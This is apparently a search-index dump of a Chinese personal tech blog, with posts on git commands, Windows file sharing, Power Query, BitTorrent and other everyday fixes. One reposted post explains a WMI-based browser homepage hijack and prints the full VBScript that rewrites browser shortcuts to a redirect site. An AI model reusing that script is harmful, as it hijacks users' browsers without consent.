[branch] [remote-branch]\n\n# 切换到指定分支，并更新工作区\n$ git checkout [branch-name]\n\n# 切换到上一个分支\n$ git checkout -\n\n# 建立追踪关系，在现有分支与指定的远程分支之间\n$ git branch --set-upstream [branch] [remote-branch]\n\n# 合并指定分支到当前分支\n$ git merge [branch]\n\n# 选择一个commit，合并进当前分支\n$ git cherry-pick [commit]\n\n# 删除分支\n$ git branch -d [branch-name]\n\n# 删除远程分支\n$ git push origin --delete [branch-name]\n$ git branch -dr [remote/branch]\n```\n\n## 六、标签\n\n```\n# 列出所有tag\n$ git tag\n\n# 新建一个tag在当前commit\n$ git tag [tag]\n\n# 新建一个tag在指定commit\n$ git tag [tag] [commit]\n\n# 删除本地tag\n$ git tag -d [tag]\n\n# 删除远程tag\n$ git push origin :refs/tags/[tagName]\n\n# 查看tag信息\n$ git show [tag]\n\n# 提交指定tag\n$ git push [remote] [tag]\n\n# 提交所有tag\n$ git push [remote] --tags\n\n# 新建一个分支，指向某个tag\n$ git checkout -b [branch] [tag]\n```\n\n## 七、查看信息\n\n```\n# 显示有变更的文件\n$ git status\n\n# 显示当前分支的版本历史\n$ git log\n\n# 显示commit历史，以及每次commit发生变更的文件\n$ git log --stat\n\n# 搜索提交历史，根据关键词\n$ git log -S [keyword]\n\n# 显示某个commit之后的所有变动，每个commit占据一行\n$ git log [tag] HEAD --pretty=format:%s\n\n# 显示某个commit之后的所有变动，其\"提交说明\"必须符合搜索条件\n$ git log [tag] HEAD --grep feature\n\n# 显示某个文件的版本历史，包括文件改名\n$ git log --follow [file]\n$ git whatchanged [file]\n\n# 显示指定文件相关的每一次diff\n$ git log -p [file]\n\n# 显示过去5次提交\n$ git log -5 --pretty --oneline\n\n# 显示所有提交过的用户，按提交次数排序\n$ git shortlog -sn\n\n# 显示指定文件是什么人在什么时间修改过\n$ git blame [file]\n\n# 显示暂存区和工作区的差异\n$ git diff\n\n# 显示暂存区和上一个commit的差异\n$ git diff --cached [file]\n\n# 显示工作区与当前分支最新commit之间的差异\n$ git diff HEAD\n\n# 显示两次提交之间的差异\n$ git diff [first-branch]...[second-branch]\n\n# 显示今天你写了多少行代码\n$ git diff --shortstat \"@{0 day ago}\"\n\n# 显示某次提交的元数据和内容变化\n$ git show [commit]\n\n# 显示某次提交发生变化的文件\n$ git show --name-only [commit]\n\n# 显示某次提交时，某个文件的内容\n$ git show [commit]:[filename]\n\n# 显示当前分支的最近几次提交\n$ git reflog\n```\n\n## 八、远程同步\n\n```\n# 下载远程仓库的所有变动\n$ git fetch [remote]\n\n# 显示所有远程仓库\n$ git remote -v\n\n# 显示某个远程仓库的信息\n$ git remote show [remote]\n\n# 增加一个新的远程仓库，并命名\n$ git remote add [shortname] [url]\n\n# 取回远程仓库的变化，并与本地分支合并\n$ git pull [remote] [branch]\n\n# 上传本地指定分支到远程仓库\n$ git push [remote] [branch]\n\n# 强行推送当前分支到远程仓库，即使有冲突\n$ git push [remote] --force\n\n# 推送所有分支到远程仓库\n$ git push [remote] --all\n```\n\n## 九、撤销\n\n```\n# 恢复暂存区的指定文件到工作区\n$ git checkout [file]\n\n# 恢复某个commit的指定文件到暂存区和工作区\n$ git checkout [commit] [file]\n\n# 恢复暂存区的所有文件到工作区\n$ git checkout .\n\n# 重置暂存区的指定文件，与上一次commit保持一致，但工作区不变\n$ git reset [file]\n\n# 重置暂存区与工作区，与上一次commit保持一致\n$ git reset --hard\n\n# 重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变\n$ git reset [commit]\n\n# 重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致\n$ git reset --hard [commit]\n\n# 重置当前HEAD为指定commit，但保持暂存区和工作区不变\n$ git reset --keep [commit]\n\n# 新建一个commit，用来撤销指定commit\n# 后者的所有变化都将被前者抵消，并且应用到当前分支\n$ git revert [commit]\n\n# 暂时将未提交的变化移除，稍后再移入\n$ git stash\n$ git stash pop\n```\n\n## 十、其他\n\n```\n# 生成一个可供发布的压缩包\n$ git archive\n```","tags":["git"],"categories":["运维"]},{"title":"windows Ubuntu 双系统卸载Ubuntu","url":"/20200322/55e721974fc2/","content":"   \n\n1. 卸载前不要删除ubuntu的任何内容，开机在Grub引导选择进入windows\n2. 以管理员权限运行cmd或powershell，输入`bcdboot C:\\Windows` 一般Windows系统在C盘，如果有自定义，请自己修改盘符。\n3. 删除或格式化ubuntu的分区","tags":["Windows","双系统","Ubuntu"],"categories":["日常"]},{"title":"Windows 10 openSSH服务器","url":"/20200322/cacc638427dd/","content":"  \n\nwindows 10 默认安装启用了openssh客户端，cmd和powershell中可以直接使用ssh命令连接到各种linux主机，但是windows 10 1909版本也提供选装的ssh服务端。\n\n## 一、启用openssh服务端\n\n打开设置-应用-应用和可选功能：\n\n![img](屏幕截图1.png)\n\n进入“可选功能”-“添加功能”-“OpenSSH服务器”-“安装即可”：\n\n![img](屏幕截图2.png)\n\n安装完成后以管理员权限运行cmd或powershell，运行命令`net start sshd` ：\n\n```\nPS C:\\Windows\\system32> net start sshd\n OpenSSH SSH Server 服务正在启动 .\n OpenSSH SSH Server 服务已经启动成功。\n```\n\n然后在服务中打开`OpenSSH SSH Server` 和 `OpenSSH Authentication Agent` 服务，需要自动启动的，将其设置为自动\n\n## 二、Windows下openssh服务端的使用\n\n默认ssh进入的shell是cmd，可以运行命令`powershell`来使用powershell，考虑到powershell使用的频率很低，所以大部分情况下还是使用sftp传输文件。\n\n推荐的sftp客户端：FileZilla","tags":["Windows","SSH"],"categories":["日常"]},{"title":"Power query插件简介 — 强大的excel辅助工具","url":"/20200228/2bf772196f74/","content":"  \n\n## 前言\n\n一直以来，excel都是被作为一个表格制作工具而不是一个数据处理工具来使用，不少人判断一个人对于excel的熟练程度往往都是看他能不能熟练地在excel里面添加各种花里胡哨的样式，而不是根据业务实际判断其对数据的组织方式的合理性。\n\n本人在工作中使用excel做过大量的数据处理，然而，在引入较大量的数据比如100行以上的情况下，数据统计计算的复杂度就随着数据量的增长而成指数量级增长。\n\n因此对于大批量的数据，本人倾向于使用类似典型的关系数据库的设计方式，即1行记录1条数据进行存储，另开表格进行统计和计算。对于大批量的数据，利用excel自带的统计函数如SUMIF和AVERAGEIF在这种情况下就略显疲态，我们需要更强大的查询和统计工具。\n\n## power query简介\n\npower query是微软官方发布的一个excel插件，office 2016以上版本自带该工具，office 2010专业增强版、2013版本需要手动下载、安装[power query插件](https://www.microsoft.com/zh-CN/download/details.aspx?id=39379)。\n\n本文以office 2016版本为例，介绍power query的基本使用方法。2019版界面略有变化，请自行试验。\n\n## 先决知识\n\n- 基本的Excel公式知识。\n- 充分认识到仅依靠公式面对批量的业务数据的局限性。\n\n## power query编辑的基本思路\n\n### 1、数据存储与数据处理\n\n了解一些编程语言的读者应该清楚的一个原则是，我们需要将数据的存储与数据的处理分开，数据的存储应由处理数据的程序写入文件或者数据库、存储在硬盘上，在需要进行数据处理时，由程序将数据读取到内存中进行增删改查等操作。数据库程序作为数据处理的部分，则是常驻在内存中，而数据本身只有在需要的时候才会被读取，以减少内存占用。power query实际上就是提供了一个图形界面，用于编写和维护上述的处理数据的程序，我们不需要关心内存管理的问题。在power query处理过程中，我们需要关心的是数据处理的结果（power query生成的结果表格）与源数据的分离。\n\n### 2、power query维护数据关系\n\n由1我们知道，power query编辑的是`数据源 ====> 统计结果`的映射，我们维护的是这一对应关系，在后续有任何数据增加、更新时，我们只需要点击`刷新`按钮，power query 会根据我们事先编辑好地规则处理源数据，然后跟新最新的结果，不再是像传统的编辑excel表格的方式；\n\n![img](query-1.png)\n\n### 3、power query不直接修改行数据\n\n正是因为power query预设的工作环境是源数据在不断变化，所以更改某一具体的行或单元格的数据是没有意义的，因为这个数据可能在下一次业务数据刷新之后就消失了，所以在编辑器中的操作都是在构建一个对源数据的处理规则，而不是编辑具体的数据；在编辑器中，所有的操作基本对象是1列，我们对数据的控制的永远是对一整列进行操作，比如替换字符串的操作，power query不提供对某一些具体的单元格范围内的字符串进行查找、替换的功能，一个替换操作的最小单位是1列数据。正是因为我们对一整列进行操作，因此一列的数据必须要是同一类型且表示同一个含义。只有这样的数据，在我们进行批量操作时才有意义。\n\n### 4、关系的鲁棒性\n\n鲁棒性是在写代码中非常常见的一个词，音/意译自英语`robust`，实际上翻译成`健壮性`更容易理解，但是`鲁棒`这个翻译实在是太接地气了，又`“鲁”`又`“棒”`。不论是哪种翻译，都是在说程序的代码需要足够的稳定、健全。可是，\n\n![img](shenme.png)\n\n我们前面提到，power query编辑的是`数据源 ====> 统计结果`的映射，这个映射是靠一步一步的步骤处理每一列来实现的，因此我们需要尽可能考虑到每一步都应全面考虑到这一步出现的所有可能情况，保证数据源数据的合法性和power query中编辑步骤的全面性。比如，分解日期列就需要保证数据源这一列全部是合理的日期。替换不需要的符号的时候就需要将所有可能出现的不需要的符号全部替换掉，即便当前数据中没有出现。如果没有考虑到所有的情况，在后续更新数据时很有可能出现某一步报错，造成后续步骤报错无法处理。这个时候再来排查错误就会非常耗时。\n\n## 基本的工作流程\n\n对于一个基本的Power query的使用，我们首先需要准备如下的内容：\n\n- 1行存储1条数据的数据源，文中使用了一个随机生成的数据列表作为示例\n- 已安装了power query插件的excel\n\n以上准备完成，我们就可以开始创建一个query：\n\n1、打开空excel表格，切换到`数据`标签，可以看到左面的标签有几个不同的数据导入来源，由于我们刚刚开始，因此，我们选择`新建查询(New Query)` => `来自文件(From File)` => `来自工作簿(From Workbook)`，然后选择上面准备的数据源。\n\n![img](1.png)\n\n2、选择`编辑（Edit）`，进入power query编辑器。 \n\n![img](2.png)\n\n3、进入编辑器后，我们可以看到一共提供了4个编辑标签页，其中前3个是我们经常使用的功能：`主页(home)`、`转换(transform)`、`添加列(add column)` \n\n![img](3-1.png)\n\n4、在主页标签下，我们可以数据分组统计计算、管理列（删除）、行（删除错误行，前n行，后n行），进行排序、分列、合并查询(merge query)、添加查询(append query)等操作\n\n5、在转换标签下，我们可以调整列的数据类形，替换值，透视列或者反透视列，对列的数据进行计算，分析、格式化日期时间等操作\n\n![img](4-1.png)\n\n6、在添加列标签下，我们可以在保留原数据列的前提下，进行计算、解析并新增列。\n\n![img](5-1.png)\n\n在power query中，最常用的功能是`分组(group by)`，合并查询(常用成多条件vlookup)、添加查询(同一类表格数据的合并)、日期时间解析和字符串的处理，这几项功能是我们在处理批量数据中最需要的功能，对批量的数据进行分组统计、并分配好对应的时间、分类之后得到的最终数据，即可再使用excel自带的透视图标进行分析。\n\n如果你需要一个源数据分多个透视表进行分析，也可以在power query中在某一步查询后复制查询，作为同一个数据源的分支，另行处理数据至想要的状态。\n\n7、处理数据后，我们点击主页标签下的`关闭并上载(close & load)`即可将编辑后的数据导入到excel表格中。\n\n![img](7.png)\n\npower query生成的数据会新开一个标签，不会覆盖当前的工作表。上载数据后，我们会发现，当我们选中任意一个由power query生成的数据单元格的时候，excel会多出两个标签，`表设计`和`查询`，后续如果发生数据更新时，直接点击`查询`标签下的`刷新`即可。\n\n![img](8.png)\n\n**注意:** 请在创建查询之前就将数据源表格放在你最终需要它们的文件夹下，否则事后移动数据源文件会导致查询找不到文件。\n\n8、当然，我们可以更改每一步步骤的参数，在编辑器的右边提供了步骤窗口，我们可以在这个窗口插入、删除、修改步骤：\n\n![img](9.png)\n\n- 插入步骤：选中你想要插入步骤的位置的前一个步骤，然后在标签页进行需要插入的操作即可；\n- 删除步骤：点击每一步前面的叉即可\n- 修改步骤：能够修改的步骤在后面都有一个齿轮，点击齿轮则会弹出这一步骤的操作窗口\n\n因此如果我们移动了工作簿的位置，就可以点点击`源(Source)`，并找到移动后的源数据工作簿的位置。\n\n## 结语\n\npower query 实际上是帮助我们方便地将数据源和数据结果分离的工具，作为真正的自动化工具非常适合各类市场、销售、运营等部门使用，配合透视图表能够自动化、可视化地更新各种日常化的数据，能够为制作报表的人员节省大量的时间，并且还能确保数据格式、图表规则的统一性。\n\n关于分组、合并查询、添加查询等功能具体教程会在后续继续增加，敬请期待。当然，你也可以自行尝试摸索，我相信自己摸索出来的知识远比看教程记得要牢固的多。\n\n## 题外话\n\n对于互联网公司或者自行运行了sql数据库的大型企业，更适合使用微软基于power query、power map等工具研发的Power BI，它从数据库等获得数据源、通过查询工具加工处理，再通过power map 和透视图表和其他可视化部件直观地展现当前的运营状态等数据，同时还提供了移动端的报表面板，非常适合各种大型企业使用。","tags":["Excel","Powerquery"],"categories":["日常"]},{"title":"抛弃迅雷，投入BT的怀抱吧","url":"/20200205/2672a7215b6a/","content":" \n\n由于最近的特殊情况，不得不宅在家中（其实没这档子事儿我也乐意待家里），于是乎就下载了大量的电影，迅雷加速基本和百度网盘一个性质，本人都没有购买会员，通过bt种子或磁力链接进行下载。并且可以跑满带宽上限。下面就分享下：\n\n## 客户端\n\n我是用的客户端是比特彗星[bitcomet](http://www.bitcomet.com/)，所谓的登录和上传升级加速之类的都是扯淡，实际当中考虑到这些bt客户端往往都有防吸血的功能，因此，上传的限速不要太过分就可以了。\n\n也可以考虑使用uTorrent客户端或者uTorrent web。\n\n## 添加Tracker\n\n### Tracker是什么？\n\n我们知道BT下载或者磁力下载是一种去中心化的网络内容分发的机制，每个人既是下载的，也是上传的，没人做种，也就没法下载。做种的人越多，你下载的速度就能越快，但是这并不是完全意义上的去中心化，因为你不知道有谁在做种。\n\n因此我们需要中心化的服务器，来将大家上传和下载的请求信息进行交换，然后各个客户端各自进行连接交换数据。\n\n### 为什么添加Tracker?\n\n简单地说， **优质的 Tracker，可以有效提高资源解析速度及下载速度。** **同时，用这些 Tracker 的人越多，大家的下载速度就越快**。\n\n### 向比特彗星添加Tracker\n\n点击[链接](http://www.bitcomet.com/en/downloads)下载比特彗星，安装完成后，可能是默认为英语，选择工具栏的Tools => Language => Chinese\n\n更改语言后，添加Tracker服务器的订阅链接。Github的XIU2汇总了一些优质的Tracker列表:\n\n- 项目地址： https://github.com/XIU2/TrackersListCollection\n- 项目网站： https://trackerslist.com/#/zh\n\n项目提供了两个订阅列表：\n\n- 精选版： https://trackerslist.com/best.txt\n- 完整版： https://trackerslist.com/all.txt\n\n请选择上面任意一个链接，复制。打开比特彗星 => 工具 => 人物设置 => Tracker => 勾选”每天自动更新Tracker服务器列表”，然后在下面的输入框内粘贴刚才复制的订阅列表，点击立即更新，确定即可。\n\n![img](捕获-2.png)","tags":["BT","Bitcommet"],"categories":["日常"]},{"title":"Linux如何查看CPU温度","url":"/20200127/8692915cd465/","content":" \n\n## CentOS系列\n\n```\nyum install lm_sensors;\nsensors-detect\nsensors\n```\n\n## Ubuntu系列\n\n```\napt-get install lm-sensors\nsensors-detect\nservice kmod start\nsensors\n```\n\n注意:根据提示选择yes/no\n\n最后的信息大致如下:\n\n```\ncoretemp-isa-0000\nAdapter: ISA adapter\nCore 0:       +38.0°C  (high = +76.0°C, crit = +100.0°C)\nCore 1:       +32.0°C  (high = +76.0°C, crit = +100.0°C)\n```\n\n最后,由于驱动升级等原因,以上的命令可能会发生一些改变,所以只能作为参考.","tags":["Linux"],"categories":["运维"]},{"title":"WMI脚本劫持浏览器","url":"/20200126/77359fa66f24/","content":"\n转载自： https://zhuanlan.zhihu.com/p/24216079\n\n用了许多年的 Mac 后，我又用回了 Windows。\n\n但最近却遇到个坑爹的问题——我的浏览器首页被劫持了。\n\n一开始的时候我是懵逼的，我看到我的浏览器设置里的首页是完全正常的，但为什么一打开浏览器就去了 [http://hao916.com](https://link.zhihu.com/?target=http%3A//hao916.com) 然后跳转到 [http://hao123.com](https://link.zhihu.com/?target=http%3A//hao123.com) 了呢？\n\n后来发现，原来是浏览器的快捷方式被修改了…………\n\n![img](image-1.jpeg)\n\n那好办，删掉后面的链接不就好了。\n\n但事实证明，毕竟我还是太年轻……后面的链接过了一段时间又回来了…………\n\n于是我就对系统查了个遍。\n\n进程？启动项？没异常啊。\n\n服务？计划任务？也没看到啥可疑的。\n\n那还可能是什么？？？？？？？ I’m angry！\n\n于是我开出了 Process Monitor。你再怎么样总得操纵这个文件吧，我就守在这里，盯着这个快捷方式，看你什么时候出动了我就把你抓了。\n\n终于，皇天不负有心人……\n\n凶手就是你了！scrcons.exe！\n\n（老大！我是无辜的！我可是地地道道的系统程序啊！）\n\n诶，这么一说也对啊。\n\n于是我就去查了一下……原来有 WMI 这种东西。这还真是搞后门的好东西。\n\n用 WMI Event Viewer 一看，原来如此……\n\n删掉即可。\n\n最后附上脚本代码：  \n\n```\nOn Error Resume Next:Const link =\n\"http://hao916.com/?r=yx37n&m=d1\":Const link360 = \"http://hao916.com/?r=yx37n&m=d1&s=3\":browsers =\n\"114ie.exe,115chrome.exe,1616browser.exe,2345chrome.exe,2345explorer.exe,360se.exe,360chrome.exe,avant.exe,baidubrowser.exe,chgreenbrowser.exe,chrome.exe,firefox.exe,greenbrowser.exe,iexplore.exe,juzi.exe,kbrowser.exe,launcher.exe,liebao.exe,maxthon.exe,niuniubrowser.exe,qqbrowser.exe,sogouexplorer.exe,srie.exe,tango3.exe,theworld.exe,tiantian.exe,twchrome.exe,ucbrowser.exe,webgamegt.exe,xbrowser.exe,xttbrowser.exe,yidian.exe,yyexplorer.exe\":lnkpaths\n= \"C:\\Users\\Public\\Desktop,C:\\ProgramData\\Microsoft\\Windows\\Start\nMenu\\Programs,C:\\Users\\sticn\\Desktop,C:\\Users\\sticn\\AppData\\Roaming\\Microsoft\\Internet\nExplorer\\Quick Launch,C:\\Users\\sticn\\AppData\\Roaming\\Microsoft\\Internet\nExplorer\\Quick Launch\\User Pinned\\StartMenu,C:\\Users\\sticn\\AppData\\Roaming\\Microsoft\\Internet\nExplorer\\Quick Launch\\User\nPinned\\TaskBar,C:\\Users\\sticn\\AppData\\Roaming\\Microsoft\\Windows\\Start\nMenu\\Programs\":browsersArr = split(browsers,\",\"):Set oDic =\nCreateObject(\"scripting.dictionary\"):For Each browser In\nbrowsersArr:oDic.Add LCase(browser), browser:Next:lnkpathsArr =\nsplit(lnkpaths,\",\"):Set oFolders =\nCreateObject(\"scripting.dictionary\"):For Each lnkpath In\nlnkpathsArr:oFolders.Add lnkpath, lnkpath:Next:Set fso = CreateObject(\"Scripting.Filesystemobject\"):Set\nWshShell = CreateObject(\"Wscript.Shell\"):For Each oFolder In\noFolders:If fso.FolderExists(oFolder) Then:For Each file In\nfso.GetFolder(oFolder).Files:If LCase(fso.GetExtensionName(file.Path)) =\n\"lnk\" Then:Set oShellLink = WshShell.CreateShortcut(file.Path):path =\noShellLink.TargetPath:name = fso.GetBaseName(path) & \".\" &\nfso.GetExtensionName(path):If oDic.Exists(LCase(name)) Then:If LCase(name) =\nLCase(\"360se.exe\") Then:oShellLink.Arguments =\nlink360:Else:oShellLink.Arguments = link:End If:If file.Attributes And 1\nThen:file.Attributes = file.Attributes - 1:End If:oShellLink.Save:End If:End\nIf:Next:End If:Next:\n```","tags":["Windows","浏览器首页"],"categories":["日常"]},{"title":"uTorrent去掉左下角广告和升级提示","url":"/20200126/fa85b267ec09/","content":" \n\n打开uTorrent ,选项->设置->高级,将下面这几条的true改成false:\n\n- offers.sponsored_torrent_offer_enabled/\n- sponsored_torrent_offer_enabled（顶部栏广告）\n- offers.left_rail_offer_enabled/left_rail_offer （左下角广告栏）\n- gui.show_plus_upsell（左下角升级到高级版的提示）","tags":["uTorrent"],"categories":["日常"]},{"title":"排除文件共享故障","url":"/20200126/02791a3f61ff/","content":"\n“文件共享”（Sharing）是被使用最多的网络远程文件访问功能，却也是最容易出问题的一部分，许多用户在使用一些优化工具后，发现文件共享功能突然就失效了，或者无论如何都无法成功共享文件，这也是很多网络管理员要面对的棘手问题，如果你也不巧遇到了，那么可以尝试检查以下几种原因：\n\n1. 相应的服务被禁止。\n   - 文件共享功能依赖于这4个服务：Computer Browser、TCP/IP NetBIOS Helper Service、Server、Workstation，如果它们的其中一个被禁止了，文件共享功能就会出现各种古怪问题如不能通过计算机名访问等，甚至完全不能访问。\n2. 内置来宾账户组成员Guest未启用。\n   - 文件共享功能需要使用Guest权限访问网络资源。\n3. 内置来宾账户组成员Guest被禁止从网络访问。\n   - 这问题常见于XP系统，因为它在组策略（gpedit.msc）->计算机配置->Windows设置->安全设置->本地策略->用户权利指派->拒绝从网络访问这台计算机里把Guest账户添加进去了，删除掉即可真正启用Guest远程访问权限。\n4. 限制了匿名访问的权限。\n   - 默认情况下，组策略（gpedit.msc）->计算机配置->Windows设置->安全设置->本地策略->安全选项->对匿名连结的额外限制的设置应该是“无。依赖于默认许可权限”或者“不允许枚举SAM账号和共享”，如果有工具自作聪明帮你把它设置为“没有显式匿名权限就无法访问”，那么我可以很负责的告诉你，你的共享全完蛋了。\n5. 系统权限指派出现意外。\n   - 默认情况下，系统会给共享目录指派一个“Everyone”账户访问授权，然而实际上它还是要使用Guest成员完成访问的工作，但是有时候，Everyone却忘记Guest的存在了，这是或我们就需要自己给共享目录手动添加一个Guest账户，才能完成远程访问。（图.手动添加一个账户权限）\n6. NTFS权限限制。\n   - 一些刚接触NTFS的用户或者新手管理员经常会出这个差错，在排除以上所有问题的前提下依然无法实现文件共享，哪里都碰过了就是偏偏不知道来看看这个目录的“安全”选项卡，并在里面设置好Everyone的相应权限和添加一个Guest权限进去。\n\n———————————–\n\n## 故障排除\n\n1. 启用来宾帐户。\n   - “控制面板-用户帐户-启用来宾帐户”   \n2. 安装NetBEUI协议。\n   - 查看“网上邻居”属性——查看“本地连接”属性——点击“安装”——查看 “协议”——看其中NetBEUI协议是否存在，如果存在则安装这个协议，如果不存在则表明已经安装了该协议，在Winxp系统默认的情况下该协议是已经安装好了的。\n3. 查看本地安全策略设置是否禁用了GUEST账号。\n   - 控制面板——管理工具——本地安全策略——用户权利指派——查看“拒绝从网络访问这台计算机”项的属性——看里面是否有GUEST帐户，如果有就把它删除掉。\n4. 设置共享文件夹。\n   - 你如果不设置共享文件夹的话，网内的其它机器无法访问到你的机器。设置文件夹共享的方法有三种：\n     1. “工具－－文件夹选项－－查看－－使用简单文件夹共享”。这样设置后，其他用户只能以Guest用户的身份访问你共享的文件或者是文件夹。\n     2. “控制面板－－管理工具－－计算机管理”，在“计算机管理”这个对话框中，依次点击“文件夹共享－－共享”，然后在右键中选择“新建共享”即可。\n     3. 直接在你想要共享的文件夹上点击右键,通过“共享和安全”选项即可设置共享。\n5. 建立工作组。\n   - 在Windows桌面上用右键点击“我的电脑”，选择“属性”，然后单击“计算机名”选项卡，看看该选项卡中有没有出现你的局域网工作组名称，如“workgroup”等。然后单击“网络 ID”按钮，开始“网络标识向导”：单击“下一步”，选择“本机是商业网络的一部分，用它连接到其他工作着的计算机”；单击“下一步”，选择“公司使用没有域的网络”；单击“下一步”按钮，然后输入你的局域网的工作组名，这里我建议大家用“BROADVIEW”，再次单击“下一步”按钮，最后单击“完成”按钮完成设置。\n   - 重新启动计算机后，局域网内的计算机就可以互访了。\n6. 查看“计算机管理”是否启用来宾帐户。  \n   - 控制面版——计算机管理——本地用户和组——用户——启用来宾帐户。机器重新启动后就可以了。\n   - 如果大家想提高访问别人机器的速度的话，还可以做一些相关操作：控制面版——管理工具——服务——Task Scheduler——属性——启动方式改为手动，这样就可以了。\n7. 用户权利指派。\n   - “控制面板－－管理工具－－本地安全策略”，在“本地安全策略”对话框中，依次选择“本地策略－－用户权利指派”，在右边的选项中依次对“从网络上访问这台计算机”和“拒绝从网络上访问这台计算机”这两个选项进行设置。\n   -  “从网络上访问这台计算机”选项需要将guest用户和everyone添加进去；“拒绝从网络上访问这台计算机”需要将被拒绝的所有用户删除掉，默认情况下guest是被拒绝访问的。\n\n上述方法的所有步骤并不是设置局域网都必须进行的，因为有些步骤在默认情况下已经设置。但是只要你的局域网出现了不能访问的现象，通过上述设置肯定能保证局域网的畅通.","tags":["Windows","文件共享"],"categories":["日常"]},{"title":"解除B站区域限制","url":"/20200126/6e2efaa31272/","content":"\n有的番由于某些原因，例如大陆禁播啦～版权被其他网站抢啦～B站的思路也是有意思，就买台湾地区的版权，大陆要看还得绕一圈\n\n## 方法一 ：安装浏览器脚本（PC）\n\n这个比较方便，去[下脚本的地方](https://greasyfork.org/zh-CN/scripts/25718-解除b站区域限制)，根据提示，先安装对应浏览器的脚本扩展：tampermonkey\n\n![img](image-3.png)\n\n安装扩展\n\n扩展装好后就可以安装脚本了，第一次打开B站网页会提示授权啥的，同意下就好了\n\n## 方法二： 挂VPN\n\n这招虽然最稳，但是比较蛋疼的是得挂台湾的VPN，偏偏我用的SS没有台湾节点，墙都翻出去了，还看不到，淡淡的忧伤啊QAQ，所以要挂VPN的朋友注意看有没有台湾节点哈（从弹幕截图来看，倒是都在推荐天行和green这俩VPN，想试试的可以去看看）","tags":["Bilibili"],"categories":["日常"]},{"title":"打开excel报文件格式或文件扩展名无效的错误","url":"/20200126/46cdabd38a24/","content":"\n前段时间测试了一下WPS，试完之后，把WPS卸载了，但是之后通过右键新建的 Microsoft Excel 工作表，再打开后提示如下：\n\n```\n Excel无法打开文件，因为文件格式或文件扩展名无效，请确定文件未损坏，并且文件扩展名与文件格式匹配。\n```\n\n![](aHR0cHM6Ly9jZG4uYmFpanVueWFvLmNvbS91cGxvYWRzL2FydGljbGUvMjAxODExMTEvNWJlODUwZTg5YmZiZC5wbmc.png)\n\n\n原因是之前同时安装了 office 和 wps ；\n后来把 wps 卸载了；\n伴随还可能出现的问题是 excel 文件的图标成空白了；\n\n 需要修改注册表，按下win+R，输入regedit\n\n![](aHR0cHM6Ly9jZG4uYmFpanVueWFvLmNvbS91cGxvYWRzL2FydGljbGUvMjAxODExMTEvNWJlODUxMDlkYWYyZi5wbmc.png)\n\n\n导航到 `HKEY_CLASSES_ROOT\\.xlsx\\ET.Xlsx.6\\ShellNew`\n \n\n![](aHR0cHM6Ly9jZG4uYmFpanVueWFvLmNvbS91cGxvYWRzL2FydGljbGUvMjAxODExMTEvNWJlODUxMmU0NDJmNC5wbmc.png)\n\n\n我们可以看到此处是 WPS ，然而 WPS 已经被卸载了， 我们把这个改成 office 的即可：\n\n- 双击 `FileName` ；\n- 输入 `C:\\Program Files (x86)\\Microsoft\\Office\\root\\VFS\\Windows\\SHELLNEW\\EXCEL12.XLSX` ；\n- 对于64位的office，更改为 `C:\\Program Files\\Microsoft Office\\root\\VFS\\Windows\\SHELLNEW\\EXCEL12.XLSX` ;\n\n.xls 格式同理；","tags":["Excel"],"categories":["日常"]},{"title":"gitbook 使用入门","url":"/20200101/6ad4cb1b7431/","content":"\n[GitBook 官网](https://www.gitbook.com/)\n\n[GitBook 文档](https://github.com/GitbookIO/gitbook)\n\n## GitBook 准备工作\n\n### 安装 Node.js\n\nGitBook 是一个基于 Node.js 的命令行工具，下载安装 Node.js，安装完成之后，你可以使用下面的命令来检验是否安装成功。\n\n```\n$ node -v\nv7.7.1\n```\n\n### 安装 GitBook\n\n输入下面的命令来安装 GitBook。\n\n> $ npm install gitbook-cli -g\n\n安装完成之后，你可以使用下面的命令来检验是否安装成功。\n\n```\n$ gitbook -V\nCLI version: 2.3.2\nGitBook version: 3.2.3\n```\n\n更多详情请参照 [GitBook 安装文档](https://github.com/GitbookIO/gitbook/blob/master/docs/setup.md) 来安装 GitBook。\n\n### 安装 GitBook 编辑器\n\n去 GitBook 官网 下载 GitBook 编辑器；如果是 Mac 用户且安装过 `brew cask` 的话可以使用 `brew cask install gitbook-editor` 命令行来安装 GitBook 编辑器。\n\n## 先睹为快\n\nGitBook 准备工作做好之后，我们进入一个你要写书的目录，输入如下命令。\n\n```\n$ gitbook init\nwarn: no summary file in this book\ninfo: create README.md\ninfo: create SUMMARY.md\ninfo: initialization is finished\n```\n\n可以看到他会创建 README.md 和 SUMMARY.md 这两个文件，README.md 应该不陌生，就是说明文档，而 SUMMARY.md 其实就是书的章节目录，其默认内容如下所示：\n\n```\n# Summary\n\n* [Introduction](README.md)\n```\n\n接下来，我们输入`$ gitbook serve` 命令，然后在浏览器地址栏中输入`http://localhost:4000` 便可预览书籍。\n\n运行该命令后会在书籍的文件夹中生成一个 `_book` 文件夹, 里面的内容即为生成的 html 文件，我们可以使用下面命令来生成网页而不开启服务器。\n\n> gitbook build\n\n下面我们来详细介绍下 GitBook 目录结构及相关文件。\n\n### 目录结构\n\nGitBook 基本的目录结构如下所示：\n\n```\n.\n├── book.json\n├── README.md\n├── SUMMARY.md\n├── chapter-1/\n|   ├── README.md\n|   └── something.md\n└── chapter-2/\n    ├── README.md\n    └── something.md\n```\n\n#### SUMMARY.md\n\n这个文件主要决定 GitBook 的章节目录，它通过 Markdown 中的列表语法来表示文件的父子关系，下面是一个简单的示例：\n\n```\n# Summary\n\n* [Introduction](README.md)\n* [Part I](part1/README.md)\n    * [Writing is nice](part1/writing.md)\n    * [GitBook is nice](part1/gitbook.md)\n* [Part II](part2/README.md)\n    * [We love feedback](part2/feedback_please.md)\n    * [Better tools for authors](part2/better_tools.md)\n```\n\n这个配置对应的目录结构如下所示:\n\n![img](1944467-de97699c5919469e.jpg)\n\n我们通过使用 标题 或者 水平分割线 将 GitBook 分为几个不同的部分，如下所示：\n\n```\n# Summary\n\n### Part I\n\n* [Introduction](README.md)\n* [Writing is nice](part1/writing.md)\n* [GitBook is nice](part1/gitbook.md)\n\n### Part II\n\n* [We love feedback](part2/feedback_please.md)\n* [Better tools for authors](part2/better_tools.md)\n\n---\n\n* [Last part without title](part3/title.md)\n```\n\n这个配置对应的目录结构如下所示:\n\n![img](1944467-e80d5e46997e5eb4.jpg)\n\n### 插件\n\nGitBook 有 插件官网，默认带有 5 个插件，highlight、search、sharing、font-settings、livereload，如果要去除自带的插件， 可以在插件名称前面加 -，比如：\n\n```\n\"plugins\": [\n    \"-search\"\n]\n```\n\n如果要配置使用的插件可以在 book.json 文件中加入即可，比如我们添加 plugin-github，我们在 book.json 